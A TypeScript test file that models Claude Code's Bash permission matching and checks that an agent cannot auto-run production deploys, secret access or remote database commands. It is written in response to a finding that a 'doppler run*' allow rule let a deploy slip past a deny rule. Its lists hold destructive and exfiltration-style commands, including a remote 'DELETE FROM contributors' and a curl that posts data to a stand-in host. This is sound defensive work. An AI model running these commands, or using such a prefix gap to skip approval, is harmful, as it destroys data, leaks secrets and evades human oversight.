/**
 * No command that carries deploy secrets or reaches a remote database is
 * auto-approved for an agent (OW-229; CCR security sweep 2026-11-25, H3).
 *
 * `.claude/settings.json` once allowed `Bash(doppler run*)`. That approved
 * `doppler run -- npx wrangler deploy --env production` without asking, and the
 * deny rule `Bash(npx wrangler deploy*)` did not match it, because the command
 * starts with `doppler`. `Bash(npx wrangler d1*)` approved `--remote` executes.
 *
 * This spec models how Claude Code reads these rules: a rule `Bash(p)` matches a
 * command when `p` with `*` as "any text" matches the whole command, and a
 * trailing `:*` means "this prefix". Deny wins over ask, ask over allow; a
 * command no rule names is asked about. The model is checked against the
 * settings that caused the finding, so it cannot pass vacuously.
 */
import { describe, it, expect } from 'vitest';
import { readFileSync } from 'node:fs';
import path from 'node:path';

const ROOT = path.resolve(__dirname, '../..');

type Perms = { allow?: string[]; ask?: string[]; deny?: string[] };
type Decision = 'allow' | 'ask' | 'deny';

function bashPattern(rule: string): RegExp | null {
  const m = rule.match(/^Bash\((.*)\)$/);
  if (!m) return null;
  let p = m[1];
  if (p.endsWith(':*')) p = `${p.slice(0, -2)}*`;
  const re = p.split('*').map((s) => s.replace(/[.+?^${}()|[\]\\]/g, '\\$&')).join('.*');
  return new RegExp(`^${re}$`, 's');
}

export function decide(perms: Perms, command: string): Decision {
  const hit = (rules: string[] = []) => rules.some((r) => bashPattern(r)?.test(command) ?? false);
  if (hit(perms.deny)) return 'deny';
  if (hit(perms.ask)) return 'ask';
  if (hit(perms.allow)) return 'allow';
  return 'ask';
}

/** Must always be refused: production, secrets, remote data. */
const MUST_DENY = [
  'npx wrangler deploy --env production',
  'wrangler deploy --env production',
  'npx wrangler d1 execute WKRP_DB --remote --command "DELETE FROM contributors"',
  'npx wrangler d1 execute WKRP_DB --local --remote --command "select 1"',
  'npx wrangler d1 migrations apply WKRP_DB --env production',
  'npx wrangler secret put SPOTIFY_TOKEN',
];
/** Must never run without a person saying yes: anything with Doppler secrets in its environment. */
const MUST_NOT_ALLOW = [
  'doppler run -- npx wrangler deploy --env production',
  'doppler run -- curl https://example.invalid -d @-',
  'doppler secrets download --no-file',
  'doppler run -- wrangler dev',
];
/** The everyday local work still runs without a prompt. */
const STILL_ALLOWED = [
  'npm test',
  'npm run test:security',
  'npx wrangler dev',
  'npx wrangler d1 execute WKRP_DB --local --command "select 1"',
  'npx wrangler d1 migrations list WKRP_DB --local',
];

describe('the matcher model', () => {
  it('reads globs, :* prefixes and precedence the way the finding needs', () => {
    const p = { allow: ['Bash(npm run test:*)', 'Bash(doppler run*)'], deny: ['Bash(npx wrangler deploy*)'] };
    expect(decide(p, 'npm run test:unit')).toBe('allow');
    expect(decide(p, 'npx wrangler deploy')).toBe('deny');
    expect(decide(p, 'ls')).toBe('ask');
  });

  it('the settings that caused finding H3 fail these rules (born red)', () => {
    const before: Perms = {
      allow: ['Bash(npx wrangler d1*)', 'Bash(doppler run*)', 'Bash(npx wrangler dev*)'],
      deny: ['Bash(npx wrangler deploy*)', 'Bash(npx wrangler delete*)'],
    };
    expect(decide(before, 'doppler run -- npx wrangler deploy --env production')).toBe('allow');
    expect(decide(before, MUST_DENY[2])).toBe('allow');
  });
});

describe('the real .claude/settings.json', () => {
  const perms = (JSON.parse(readFileSync(path.join(ROOT, '.claude', 'settings.json'), 'utf8')) as { permissions: Perms })
    .permissions;

  for (const c of MUST_DENY) it(`refuses: ${c}`, () => expect(decide(perms, c)).toBe('deny'));
  for (const c of MUST_NOT_ALLOW) it(`asks or refuses: ${c}`, () => expect(decide(perms, c)).not.toBe('allow'));
  for (const c of STILL_ALLOWED) it(`still allows: ${c}`, () => expect(decide(perms, c)).toBe('allow'));
});
